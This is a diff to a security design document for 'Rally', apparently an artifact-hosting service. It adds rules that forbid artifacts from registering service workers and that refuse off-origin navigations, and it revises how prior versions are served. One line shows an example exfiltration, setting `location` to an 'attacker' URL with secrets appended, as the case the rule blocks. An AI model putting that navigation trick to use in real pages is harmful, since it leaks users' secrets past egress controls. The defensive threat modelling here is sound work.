@@ -181,6 +181,16 @@ is the only place that can forward into it.
   that can overlap the rail — a dialog, the command palette, a lightbox — must
   collapse the view to nothing while it is open, or artifact content paints over
   it.
+- **No artifact may register a service worker.** `worker-src 'none'` is written
+  out because `default-src 'self'` would permit a same-origin one, and a
+  root-scoped service worker is the single thing an artifact can install that
+  answers requests without reaching Rally at all — defeating revocation, the
+  current-version guarantee, and the offline message in one move.
+- **Nothing an artifact composes is handed to the system browser.** An
+  off-origin navigation is refused, not opened externally: `location = "https://
+  attacker/?" + secrets` is a navigation, which `connect-src` and `form-action`
+  do not touch, and opening it would make Rally perform the exfiltration the
+  egress fence exists to prevent.
 - **The asset manifest is the only index.** Nothing resolves a path the manifest
   does not name, which is what makes the server module's absence from `assets` a
   real 404 rather than a convention.
@@ -242,10 +252,14 @@ facet that holds a stateful artifact's data. It does not own:
 - **A prior version of a stateful artifact.** Source only, never live: one facet
   runs one class, so serving old code would abort the facet under current
   viewers, and old code against a live schema is undefined besides.
-- **A prior version mount.** Unsafe methods and service-worker registration are
-  refused at the request path rather than assumed harmless of frozen bytes; a
-  service worker's scope would outlive the view and interpose on the canonical
-  origin.
+- **A prior version mount.** Unsafe methods are refused at the request path,
+  and a prior version renders its **frozen assets only** — its module is never
+  loaded. That is not caution but the removal of a class: a root-absolute
+  `fetch("/api/…")` from a historical render is an ordinary same-origin request
+  to the canonical path, and `Referrer-Policy: no-referrer` leaves nothing to
+  tell it apart from one the current page made, so the escape cannot be closed
+  at the request path. What remains is a page whose client script may read the
+  current version's data — a wrong reading rather than an unauthorized one.
 - **Numeric limits.** Viewer session lifetime is 24 hours, fixed from mint and
   never sliding — the shape, not just the number, is the sleep guarantee, since
   compute per open is bounded by rate ceiling × lifetime. The open code lives 60
